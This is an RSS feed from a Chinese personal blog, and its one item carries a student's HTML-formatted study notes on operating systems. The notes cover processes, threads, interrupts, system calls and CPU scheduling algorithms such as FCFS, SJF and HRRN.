<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>岁余的博客</title>
        <link>http://example.com</link>
        <description>welcome</description>
        <language>zh-CN</language>
        <pubDate>Mon, 14 Aug 2023 14:41:54 +0800</pubDate>
        <lastBuildDate>Mon, 14 Aug 2023 14:41:54 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://example.com/2023/08/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</guid>
            <title>操作系统</title>
            <link>http://example.com/2023/08/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</link>
            <pubDate>Mon, 14 Aug 2023 14:41:54 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;操作系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#操作系统&#34;&gt;#&lt;/a&gt; 操作系统&lt;/h1&gt;
&lt;h3 id=&#34;11_1-操作系统的概念-功能和目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_1-操作系统的概念-功能和目标&#34;&gt;#&lt;/a&gt; 1.1_1 操作系统的概念、功能和目标&lt;/h3&gt;
&lt;p&gt;操作系统是指控制和管理整个计算机系统的硬件和软件资源，并合理地组织调度计算机的工作和资源的分配，以提供给用户和其他软件方便的接口和环境，它是计算机系统中最基本的系统软件；&lt;br&gt;
操作系统的特征（并发、共享、虚拟、异步）；&lt;br&gt;
操作系统的功能：&lt;/p&gt;
&lt;p&gt;1）作为用户与计算机硬件系统之间的接口；&lt;/p&gt;
&lt;p&gt;2）作为计算机系统资源的管理者；&lt;br&gt;
3）实现对计算机资源的抽象。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/ccdb31948c9e730f27c0b2a4ff899ec0.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;11_2-操作系统的特征&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_2-操作系统的特征&#34;&gt;#&lt;/a&gt; 1.1_2 操作系统的特征&lt;/h3&gt;
&lt;p&gt;并发 | 并行&lt;/p&gt;
&lt;p&gt;并发：多个事件交替发生（宏观同时发生、微观交替进行）&lt;br&gt;
并行：多个事件同时发生&lt;/p&gt;
&lt;p&gt;共享&lt;/p&gt;
&lt;p&gt;两种资源共享方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;互斥共享方式：一个时间段内只允许一个进程访问该资源&lt;/li&gt;
&lt;li&gt;同时共享方式：允许一个时间段内由多个进程 “同时” 对它们进行访问&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;并发和共享是多用户 os 的两个最基本的特征&lt;/p&gt;
&lt;p&gt;虚拟&lt;/p&gt;
&lt;p&gt;概念：把一个物理上的实体变为若干个逻辑上的对应物&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空分复用计数&lt;/li&gt;
&lt;li&gt;时分复用计数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;异步&lt;/p&gt;
&lt;p&gt;概念：在多道程序环境下，允许多个程序并发执行，以不可预知的速度向前推进。只有系统拥有并发性，才有可能导致异步性。&lt;/p&gt;
&lt;h3 id=&#34;11_3-操作系统的发展与分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_3-操作系统的发展与分类&#34;&gt;#&lt;/a&gt; 1.1_3 操作系统的发展与分类&lt;/h3&gt;
&lt;p&gt;OS 的发展与分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;手工操作阶段
&lt;ul&gt;
&lt;li&gt;纸带机（用户独占全机、人机速度矛盾）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;批处理阶段 ——dan’dao
&lt;ul&gt;
&lt;li&gt;单道批处理系统（外围机 —— 磁带）&lt;/li&gt;
&lt;li&gt;多道批处理系统（操作系统开始出现）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;分时操作系统
&lt;ul&gt;
&lt;li&gt;轮流处理作业&lt;/li&gt;
&lt;li&gt;不能处理紧急任务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;实时操作系统
&lt;ul&gt;
&lt;li&gt;优先处理紧急任务&lt;/li&gt;
&lt;li&gt;硬实时系统：必须在严格的时间内完成处理&lt;/li&gt;
&lt;li&gt;软实时系统：可以偶尔犯错&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;网络操作系统&lt;/li&gt;
&lt;li&gt;分布式操作系统&lt;/li&gt;
&lt;li&gt;个人计算机操作系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;11_4-操作系统的运行机制与体系结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_4-操作系统的运行机制与体系结构&#34;&gt;#&lt;/a&gt; 1.1_4 操作系统的运行机制与体系结构&lt;/h3&gt;
&lt;p&gt;OS 的运行机制和体系结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行机制
&lt;ul&gt;
&lt;li&gt;两种指令
&lt;ul&gt;
&lt;li&gt;特权指令&lt;/li&gt;
&lt;li&gt;非特权指令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;两种处理器状态
&lt;ul&gt;
&lt;li&gt;内核态（root）&lt;/li&gt;
&lt;li&gt;用户态&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;两种程序
&lt;ul&gt;
&lt;li&gt;内核程序 (运行在核心态)&lt;/li&gt;
&lt;li&gt;应用程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作系统内核
&lt;ul&gt;
&lt;li&gt;时钟管理（实现计时功能）&lt;/li&gt;
&lt;li&gt;中断处理&lt;/li&gt;
&lt;li&gt;原语（程序运行具有原子性，不可中断）&lt;/li&gt;
&lt;li&gt;对系统资源进行管理的功能
&lt;ul&gt;
&lt;li&gt;进程管理&lt;/li&gt;
&lt;li&gt;存储器管理&lt;/li&gt;
&lt;li&gt;设备管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作系统的体系结构
&lt;ul&gt;
&lt;li&gt;大内核（将操作系统的主要功能模块都作为系统内核，运行在核心态）&lt;/li&gt;
&lt;li&gt;微内核（只把最基本的功能保留在内核）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;11_5-中断和异常&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_5-中断和异常&#34;&gt;#&lt;/a&gt; 1.1_5 中断和异常&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;中断机制的诞生
&lt;ul&gt;
&lt;li&gt;操作系统介入，开展管理工作&lt;/li&gt;
&lt;li&gt;“用户态 —&amp;gt; 核心态” 是通过中断实现的。并且中断是唯一途径&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;中断的概念和作用&lt;/li&gt;
&lt;li&gt;中断的分类
&lt;ul&gt;
&lt;li&gt;内中断（异常）
&lt;ul&gt;
&lt;li&gt;陷阱（trap）&lt;/li&gt;
&lt;li&gt;故障（fault）&lt;/li&gt;
&lt;li&gt;中止（abort）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;外中断 （CPU 外部）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;外中断的处理过程&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;11_6-系统调用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_6-系统调用&#34;&gt;#&lt;/a&gt; 1.1_6 系统调用&lt;/h3&gt;
&lt;p&gt;概念：应用程序通过系统调用请求操作系统的服务。保证系统的稳定性和安全性。&lt;/p&gt;
&lt;p&gt;系统调用和库函数的区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;系统调用是操作系统向上层提供的接口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;有的库函数是对系统调用的进一步封装&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当今编写的应用程序大多是通过高级语言提供的库函数间接地进行系统调用、&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;21_1-进程的定义-组成-组织方式-特征&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_1-进程的定义-组成-组织方式-特征&#34;&gt;#&lt;/a&gt; 2.1_1 进程的定义、组成、组织方式、特征&lt;/h3&gt;
&lt;p&gt;定义：一段可并发执行的具有独立功能的程序，是关于某个数据集的一次执行过程。也是 os 进行资源分配和保护的基本单位&lt;/p&gt;
&lt;p&gt;组成：PCB（进程存在唯一的标志），程序段，数据段，堆栈&lt;/p&gt;
&lt;p&gt;组织方式：链接方式，指针指向不同的队列；索引方式，索引表；线性方式，线性表&lt;/p&gt;
&lt;p&gt;特征：动态性、并发性、独立性、异步&lt;/p&gt;
&lt;p&gt;PCB 中的信息：进程标识符、处理机状态、进程调度信息、进程控制信息&lt;/p&gt;
&lt;p&gt;C 语言编写的程序在使用内存时一般分为三个段，它们一般是正文段（即代码和赋值数据段）、&lt;br&gt;
数据堆段和数据栈段。二进制代码和常量存放在正文段，动态分配的存储区在数据堆段，临时使&lt;br&gt;
用的变量在数据栈段。由此，我们可以确定全局赋值变量在正文段赋值数据段，未赋值的局部变&lt;br&gt;
量和实参传递在栈段，动态内存分配在堆段，常量在正文段，进程的优先级只能在 PCB 内。&lt;/p&gt;
&lt;h3 id=&#34;21_2-进程的状态与转换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_2-进程的状态与转换&#34;&gt;#&lt;/a&gt; 2.1_2 进程的状态与转换&lt;/h3&gt;
&lt;p&gt;状态：&lt;/p&gt;
&lt;p&gt;运行状态：占有 CPU (内存)，并在 CPU (内存) 上运行，单核只能一个进程（双核两个）（CPU√，其它资源√）&lt;/p&gt;
&lt;p&gt;就绪状态：已经具备运行条件，但是没有空闲的 CPU (内存)，暂时不能运行（CPU &lt;strong&gt;X&lt;/strong&gt;，其它资源√）&lt;/p&gt;
&lt;p&gt;阻塞状态：等在某个事件的发生，暂时不能运行（CPU &lt;strong&gt;X&lt;/strong&gt;，其它资源 &lt;strong&gt;X&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;创建状态：创建 PCB，程序段，数据段&lt;/p&gt;
&lt;p&gt;终止状态：回收内存，程序段，数据段，撤销 PCB&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQkYlOUIlRTclQTglOEIlRTclOEElQjYlRTYlODAlODEmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;进程状态&lt;/span&gt;间的转换 (图，且只能这样转化)&lt;/p&gt;
&lt;p&gt;创建态 -&amp;gt; 就绪态&lt;/p&gt;
&lt;p&gt;就绪态 -&amp;gt; 运行态&lt;/p&gt;
&lt;p&gt;运行态 -&amp;gt; 就绪态&lt;/p&gt;
&lt;p&gt;运行态 -&amp;gt; 中止态（比如数组越界）&lt;/p&gt;
&lt;p&gt;运行态 -&amp;gt; 阻塞态（主动）&lt;/p&gt;
&lt;p&gt;阻塞态 -&amp;gt; 就绪态（被动）&lt;/p&gt;
&lt;h3 id=&#34;21_3-进程控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_3-进程控制&#34;&gt;#&lt;/a&gt; 2.1_3 进程控制&lt;/h3&gt;
&lt;p&gt;基本概念：&lt;/p&gt;
&lt;p&gt;什么是进程控制？&lt;/p&gt;
&lt;p&gt;答：实现各种进程状态转换。&lt;/p&gt;
&lt;p&gt;如何实现进程控制？&lt;/p&gt;
&lt;p&gt;答：用 “原语” 实现。&lt;/p&gt;
&lt;p&gt;原语做的事情：&lt;/p&gt;
&lt;p&gt;1、更新 PCB 中的信息&lt;/p&gt;
&lt;p&gt;2、将 PCB 插入合适的队列&lt;/p&gt;
&lt;p&gt;3、分配 / 回收资源&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;进程控制相关的原语：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、进程的创建：&lt;/p&gt;
&lt;p&gt;创建原语：申请空白 PCB、为新进程分配所需资源、初始化 PCB、将 PCB 插入就绪队列&lt;/p&gt;
&lt;p&gt;引起进程创建的事件：用户登录、作业调度、提供服务、应用请求&lt;/p&gt;
&lt;p&gt;2、进程的终止：&lt;/p&gt;
&lt;p&gt;撤销原语&lt;/p&gt;
&lt;p&gt;引起进程中止的事件：正常结束、异常结束、外界干预&lt;/p&gt;
&lt;p&gt;3、进程的阻塞：&lt;/p&gt;
&lt;p&gt;阻塞原语：运行态 -&amp;gt; 阻塞态&lt;/p&gt;
&lt;p&gt;引起进程阻塞的事件：需要等待系统分配某种资源、需要等待相互合作的其他进程完成工作&lt;/p&gt;
&lt;p&gt;4、进程的唤醒：&lt;/p&gt;
&lt;p&gt;唤醒原语：阻塞态 -&amp;gt; 就绪态&lt;/p&gt;
&lt;p&gt;引起进程唤醒的事件：等待的事件发生&lt;/p&gt;
&lt;p&gt;5、进程的切换&lt;/p&gt;
&lt;p&gt;切换原语&lt;/p&gt;
&lt;p&gt;引起进程切换的事件：当前进程事件片到、有更高优先级的进程到达、当前进程主动阻塞、当前进程终止&lt;/p&gt;
&lt;h3 id=&#34;21_4-进程通信&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_4-进程通信&#34;&gt;#&lt;/a&gt; 2.1_4 进程通信&lt;/h3&gt;
&lt;p&gt;1、共享存储 （分配共享空间，且互斥（P、V 操作）&lt;/p&gt;
&lt;p&gt;基于数据结构的共享：固定分配（低级）&lt;/p&gt;
&lt;p&gt;基于存储区的共享：划分存储区（高级）&lt;/p&gt;
&lt;p&gt;2、消息传递&lt;/p&gt;
&lt;p&gt;消息：消息头、消息体&lt;/p&gt;
&lt;p&gt;直接通信方式（直接挂载消息）&lt;/p&gt;
&lt;p&gt;间接通信方式（间接利用信箱发送消息）&lt;/p&gt;
&lt;p&gt;3、管道通信（pipe）&lt;/p&gt;
&lt;p&gt;只能半双工通信&lt;/p&gt;
&lt;p&gt;互斥（没写满，不能读，反之同理）&lt;/p&gt;
&lt;h3 id=&#34;21_5-线程概念和多线程模型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_5-线程概念和多线程模型&#34;&gt;#&lt;/a&gt; 2.1_5 线程概念和多线程模型&lt;/h3&gt;
&lt;p&gt;什么是线程，为什么要引入线程？&lt;/p&gt;
&lt;p&gt;答：线程是一个基本的 CPU 执行单元，也是程序执行流的最小单位，进一步提高了系统的并发度&lt;/p&gt;
&lt;p&gt;引入线程机制后，有什么变化？&lt;/p&gt;
&lt;p&gt;资源分配、调度：进程是资源分配的基本单位，线程是调度的基本单位&lt;/p&gt;
&lt;p&gt;并发性：各线程间也能并发，提升了并发度&lt;/p&gt;
&lt;p&gt;系统开销：可以只在进程中切换，减小了 CPU 切换环境的系统开销&lt;/p&gt;
&lt;p&gt;1、线程有哪些重要的属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;线程是处理机调度的基本单位&lt;/li&gt;
&lt;li&gt;多 CPU 计算机中，各个线程可占用不同的 CPU&lt;/li&gt;
&lt;li&gt;每个线程都有一个线程 ID、线程控制块（TCB）&lt;/li&gt;
&lt;li&gt;线程也有就绪、阻塞、运行三种基本状态&lt;/li&gt;
&lt;li&gt;线程几乎不拥有系统资源&lt;/li&gt;
&lt;li&gt;同一进程的不同线程间共享进程的资源&lt;/li&gt;
&lt;li&gt;由于共享内存地址空间，统一进程中的线程间通信甚至无需系统干预&lt;/li&gt;
&lt;li&gt;同一进程中的线程切换，不会引起进程切换&lt;/li&gt;
&lt;li&gt;不同进程中的线程切换，会引起进程切换&lt;/li&gt;
&lt;li&gt;切换同进程内的线程，系统开销很小&lt;/li&gt;
&lt;li&gt;切换进程，系统开销较大&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、线程的实现方式&lt;/p&gt;
&lt;p&gt;用户级线程（ULT）：&lt;/p&gt;
&lt;p&gt;由应用管理，从用户的视角看能看到的线程&lt;/p&gt;
&lt;p&gt;内核级线程（KLT）：&lt;/p&gt;
&lt;p&gt;由操作系统管理，从操作系统内核视角看能看到的线程&lt;/p&gt;
&lt;p&gt;n 个 ULT 可以映射到 m 个 KLT 上（n&amp;gt;=m）&lt;/p&gt;
&lt;p&gt;内核级线程才是处理机分配的单位&lt;/p&gt;
&lt;p&gt;3、多线程模型&lt;/p&gt;
&lt;p&gt;多对一模型&lt;/p&gt;
&lt;p&gt;n 个 ULT 映射到 1 个 KLT&lt;/p&gt;
&lt;p&gt;优点：开销小，效率高&lt;/p&gt;
&lt;p&gt;缺点： 容易阻塞，并发度不高&lt;/p&gt;
&lt;p&gt;一对一模型&lt;/p&gt;
&lt;p&gt;n 个 ULT 映射到 n 个 KLT&lt;/p&gt;
&lt;p&gt;优点：并发能力很强&lt;/p&gt;
&lt;p&gt;缺点：占用成本高，开销大&lt;/p&gt;
&lt;p&gt;多对多模型&lt;/p&gt;
&lt;p&gt;n 个 ULT 映射到 m 个 KLT 上（n&amp;gt;=m）&lt;/p&gt;
&lt;p&gt;中和以上两种优缺点&lt;/p&gt;
&lt;h3 id=&#34;22_1-处理机调度的概念-层次&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_1-处理机调度的概念-层次&#34;&gt;#&lt;/a&gt; 2.2_1 处理机调度的概念、层次&lt;/h3&gt;
&lt;p&gt;基本概念&lt;/p&gt;
&lt;p&gt;通常进程数量大于处理机数量，所以要按照一定的算法选择一个进程，并将处理机分配给它运行，以实现进程的并发执行&lt;/p&gt;
&lt;p&gt;调度的实质是一种资源分配&lt;/p&gt;
&lt;p&gt;三个层次&lt;/p&gt;
&lt;p&gt;高级调度（作业调度）&lt;/p&gt;
&lt;p&gt;调度对象是作业&lt;/p&gt;
&lt;p&gt;作业：作业包含通常所说的程序和数据，还配有作业说明书。系统根据该说明书&lt;br&gt;
对程序的运行进行控制。批处理系统中是以作业为基本单位将其从外存调人内存的。&lt;/p&gt;
&lt;p&gt;辅助外存与内存之间的调度，作业调入时会建立相应的 PCB，作业调出时才撤销 PCB，调入可由操作系统决定，调出由作业运行结束才调出&lt;/p&gt;
&lt;p&gt;中级调度（内存调度）&lt;/p&gt;
&lt;p&gt;将暂时不用的进程放到外存（PCB 不外放）&lt;/p&gt;
&lt;p&gt;目的：提高内存利用率和系统吞吐量，&lt;/p&gt;
&lt;p&gt;进程状态为挂起状态，形成挂起队列&lt;/p&gt;
&lt;p&gt;低级调度（进程调度）&lt;/p&gt;
&lt;p&gt;调用对象是进程&lt;/p&gt;
&lt;p&gt;最基本，用算法为进程分配处理机资源，几十 ms 一次&lt;/p&gt;
&lt;p&gt;三种调度中低级调度运行频率最高&lt;/p&gt;
&lt;p&gt;三层调度的联系、对比&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230724221856195.png&#34; alt=&#34;image-20230724221856195&#34;&gt;&lt;/p&gt;
&lt;p&gt;进程的 “挂起态”&lt;/p&gt;
&lt;p&gt;七状态模型&lt;/p&gt;
&lt;p&gt;五状态前面学了，挂起分为就绪挂起、阻塞挂起&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/6ea9441c9d17d1d23c2ce2d000f7658b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;22_2-进程调度的时机-切换与过程调度方式任务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_2-进程调度的时机-切换与过程调度方式任务&#34;&gt;#&lt;/a&gt; 2.2_2 进程调度的时机、切换与过程调度方式，任务&lt;/h3&gt;
&lt;p&gt;1、时机&lt;/p&gt;
&lt;p&gt;什么时候需要进程调度？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主动放弃（进程正常终止、运行过程中发生异常而终止、进程主动请求阻塞）&lt;/li&gt;
&lt;li&gt;被动放弃（分给进程的时间片用完、有更紧急的事需要处理、有更高优先级的进程进入就绪队列）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;什么时候不能进行进程调度？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在处理中断的过程中&lt;/li&gt;
&lt;li&gt;在操作系统内核程序临界区中
&lt;ul&gt;
&lt;li&gt;临界资源：一个时段段内各进程互斥地访问临界资源&lt;/li&gt;
&lt;li&gt;临界区：访问临界资源的那段代码&lt;/li&gt;
&lt;li&gt;内核程序临界区会访问就绪队列，导致其上锁&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在原子操作过程中（原语）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、切换与过程&lt;/p&gt;
&lt;p&gt;“狭义的调度” 与 “进程切换” 的区别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;狭义：选择一个进程&lt;/li&gt;
&lt;li&gt;广义：狭义 + 进程切换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进程切换的过程需要做什么？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对原来运行进程各种数据的保存&lt;/li&gt;
&lt;li&gt;对新的进程各种数据的恢复&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、方式&lt;/p&gt;
&lt;p&gt;非剥夺调度方式（非抢占式）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只允许进程主动放弃处理机&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;剥夺调度方式（抢占式）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进程被动放弃，可以优先处理紧急任务，适合分时操作系统、实时操作系统&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;任务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保存 CPU 现场信息&lt;/li&gt;
&lt;li&gt;按某种算法选取进程&lt;/li&gt;
&lt;li&gt;把 CPU 分配给进程&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进程等待时间-平均等待时间-周转时间-平均周转时间-带权周转时间-平均带权周转时间&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进程等待时间-平均等待时间-周转时间-平均周转时间-带权周转时间-平均带权周转时间&#34;&gt;#&lt;/a&gt; 进程等待时间、平均等待时间、周转时间、平均周转时间、带权周转时间、平均带权周转时间&lt;/h2&gt;
&lt;h4 id=&#34;先来先服务-非抢占试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#先来先服务-非抢占试&#34;&gt;#&lt;/a&gt; 先来先服务 非抢占试&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725120656092.png&#34; alt=&#34;image-20230725120656092&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;短作业优先-抢占式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#短作业优先-抢占式&#34;&gt;#&lt;/a&gt; 短作业优先 抢占式&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725123547962.png&#34; alt=&#34;image-20230725123547962&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725123623693.png&#34; alt=&#34;image-20230725123623693&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124114998.png&#34; alt=&#34;image-20230725124114998&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;高响应比优先hrrn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#高响应比优先hrrn&#34;&gt;#&lt;/a&gt; 高响应比优先（HRRN)&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124556832.png&#34; alt=&#34;image-20230725124556832&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;22_3-调度算法的评价指标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_3-调度算法的评价指标&#34;&gt;#&lt;/a&gt; 2.2_3 调度算法的评价指标&lt;/h3&gt;
&lt;p&gt;1、CPU 利用率&lt;/p&gt;
&lt;p&gt;CPU 利用率 = CPU 忙碌的时间 / 总时间&lt;/p&gt;
&lt;p&gt;2、系统吞吐量&lt;/p&gt;
&lt;p&gt;= 总共完成了多少道作业 / 总共画了多少时间&lt;/p&gt;
&lt;p&gt;3、周转时间&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;周转时间（提交作业到完成作业花费的时间）、平均周转时间（各作业周转时间之和 / 作业数）&lt;/li&gt;
&lt;li&gt;带权周转时间（作业周转时间 / 作业实际运行的时间）、平均带权周转时间（各作业带权周转时间 / 作业数）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4、等待时间&lt;/p&gt;
&lt;p&gt;进程或作业等待处理机状态时间的和&lt;/p&gt;
&lt;p&gt;进程：等待被服务的时间之和&lt;/p&gt;
&lt;p&gt;作业：建立后的等待时间 + 作业在外存后备队列中等待的时间&lt;/p&gt;
&lt;p&gt;5、响应时间&lt;/p&gt;
&lt;p&gt;从用户提交请求到首次产生响应所用的时间&lt;/p&gt;
&lt;h3 id=&#34;22_4-fcfs-sjf-hrrn调度算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_4-fcfs-sjf-hrrn调度算法&#34;&gt;#&lt;/a&gt; 2.2_4 FCFS、SJF、HRRN 调度算法&lt;/h3&gt;
&lt;h4 id=&#34;1-先来先服务fcfs&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-先来先服务fcfs&#34;&gt;#&lt;/a&gt; 1、先来先服务（FCFS）&lt;/h4&gt;
&lt;p&gt;先到达先进行服务&lt;/p&gt;
&lt;p&gt;作业 - 后备队列；进程 - 就绪队列&lt;/p&gt;
&lt;p&gt;非抢占式&lt;/p&gt;
&lt;p&gt;公平、算法简单&lt;/p&gt;
&lt;p&gt;对长作业有利、对短作业不利、不会饥饿&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124249868.png&#34; alt=&#34;image-20230725124249868&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-短作业优先sjfshortest-job-first&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-短作业优先sjfshortest-job-first&#34;&gt;#&lt;/a&gt; 2、短作业优先（SJF，shortest job first）&lt;/h4&gt;
&lt;p&gt;最短（服务时间最短）的作业优先得到服务，时间相同，先到达的先被服务&lt;/p&gt;
&lt;p&gt;非抢占式（SJF）：选最短需要时间的作业先进入运行态&lt;/p&gt;
&lt;p&gt;抢占式（SRTN）：有新作业进入就绪队列或有作业完成了，考察队列中的最小需要时间的作业&lt;/p&gt;
&lt;p&gt;在所有进程都几乎同时到达时，采用 SJP 调度算法的平均等待时间、平均周转时间最少&lt;/p&gt;
&lt;p&gt;若无红色前提，抢占式的短作业 / 进程的平均时间最少&lt;/p&gt;
&lt;p&gt;优点：“最短的” 平均等待时间，平均周转时间，能尽快处理完短作业&lt;/p&gt;
&lt;p&gt;缺点：对短作业有利，对长作业不利，可能产生饥饿现象&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124227156.png&#34; alt=&#34;image-20230725124227156&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3-高响应比优先hrrn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-高响应比优先hrrn&#34;&gt;#&lt;/a&gt; 3、高响应比优先（HRRN）&lt;/h4&gt;
&lt;p&gt;要综合考虑作业 / 进程的等待时间和要求服务的时间&lt;/p&gt;
&lt;p&gt;在每次调度时先计算各个作业 / 进程的响应比，选择响应比最高的作业 / 进程为其服务&lt;/p&gt;
&lt;p&gt;响应比 =（等待时间 + 要求服务时间）/ 要求服务时间&lt;/p&gt;
&lt;p&gt;非抢占式&lt;/p&gt;
&lt;p&gt;进程主动放弃 CPU 时，需要该算法选取就绪队列的作业&lt;/p&gt;
&lt;p&gt;不会饥饿&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124748328.png&#34; alt=&#34;image-20230725124748328&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;三种调度算法比较&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三种调度算法比较&#34;&gt;#&lt;/a&gt; 三种调度算法比较&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230725124813386.png&#34; alt=&#34;image-20230725124813386&#34;&gt;&lt;/p&gt;
